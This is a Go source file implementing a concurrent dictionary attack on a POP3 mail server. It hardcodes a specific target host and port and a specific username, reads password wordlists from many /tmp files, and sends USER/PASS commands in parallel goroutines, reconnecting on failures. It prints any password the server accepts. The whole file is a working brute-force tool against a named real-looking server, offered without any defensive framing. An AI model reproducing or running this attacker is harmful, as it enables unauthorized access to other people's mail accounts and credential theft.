//
// cloud@txthinking.com
package main

import (
	"net"
	"fmt"
	"bufio"
	"io"
	"strings"
    "time"
    "os"
)

func main(){
	var userName string = "susin"

    d := []string{"_ca","_caa","_cab","_cac","_cad","_cae","_caf","_cag","_cah","_cai","_caj","_cak","_cal","_cam","_can","_cao","_cap","_caq","_car","_cas","_cat","_cau","_cav","_caw","_cax","_cay","_caz","_cb","_cba","_cbb","_cbc","_cbd","_cbe","_cbf","_cbg","_cbh","_cbi","_cbj","_cbk","_cbl","_cbm","_cbn","_cbo","_cbp","_cbq","_cbr","_cbs","_cbt","_cbu","_cbv","_cbw","_cbx","_cby","_cbz","_cc","_cca","_ccb","_ccc","_ccd","_cce","_ccf","_ccg","_cch","_cci","_ccj","_cck","_ccl","_ccm","_ccn","_cco","_ccp","_ccq","_ccr","_ccs","_cct","_ccu","_ccv","_ccw","_ccx","_ccy","_ccz","_cd","_cda","_cdb","_cdc","_cdd","_cde","_cdf","_cdg","_cdh","_cdi","_cdj","_cdk","_cdl","_cdm","_cdn","_cdo","_cdp","_cdq","_cdr","_cds","_cdt","_cdu","_cdv","_ce","_cf","_cg","_ch","_ci","_cj","_ck","_cl","_cm","_cn","_co","_cp","_cq","_cr","_cs","_ct","_cu","_cv","_cw","_cx","_cy","_cz"}


    c := make(chan int)
    di := make(chan int, len(d))

    for i:=0; i<len(d); i++{
        di <- i
    }

    for j:=0; j<len(d); j++{
        go func(){
            ii := <-di

            // first con
            /*nc, e := net.Dial("tcp", "mail.qiwipay.cn:8080")*/
            nc, e := net.DialTimeout("tcp", "mail.qiwipay.cn:8080", time.Minute * 10)
            if e != nil {
                fmt.Println("NOT DONE:", d[ii])
                <- c
                return
            }
            defer nc.Close()
            _, _ = getCode(nc, "")
            in := "USER "+userName+"\r\n"
            _, _ = getCode(nc, in)

            // read dict
            f, _ := os.OpenFile("/tmp/" + d[ii], os.O_RDONLY, 0444)
            defer f.Close()
            bnr := bufio.NewReader(f)

            // send
            for{
                line, err := bnr.ReadString('\n')
                if err==io.EOF {
                    break
                }
                password := strings.TrimSpace(line)

                in = "PASS "+password+"\r\n"
                out, ok := getCode(nc, in)
                if !ok{
                    time.Sleep(100 * time.Millisecond)
                    if out != "-ERR Authentication failed\r\n"{
                        nc, err = net.DialTimeout("tcp", "mail.qiwipay.cn:8080", time.Minute * 10)
                        if err != nil {
                            fmt.Println("NOT DONE:", d[ii])
                            <- c
                            return
                        }
                        _, _ = getCode(nc, "")
                        in = "USER "+userName+"\r\n"
                        _, _ = getCode(nc, in)
                    }
                }else{
                    fmt.Println(password)
                    <- c
                    return
                }
            }
            fmt.Println("DONE:", d[ii])
            <- c
        }()
    }

    for j:=0;j<len(d);j++{
        c <- 0
    }

    fmt.Println("END")

}

//
// net.Conn is a interface type so can not use pointer *net.Conn
// like bufio.Reader is a struct so need use *bufio.Reader
// this is just my first think
///
func getCode(nc net.Conn, in string) (string, bool){
    out := ""
	yn := false

	fmt.Fprintf(nc, in)
	br := bufio.NewReader(nc)
	for {
		line, err := br.ReadString('\n')

		if err==io.EOF {
			break
		}
		out += line
		if strings.Contains(line, "+OK"){
			yn = true
			break
		}
		if strings.Contains(line, "-ERR"){
			yn = false
			break
		}
	}
	return out, yn
}

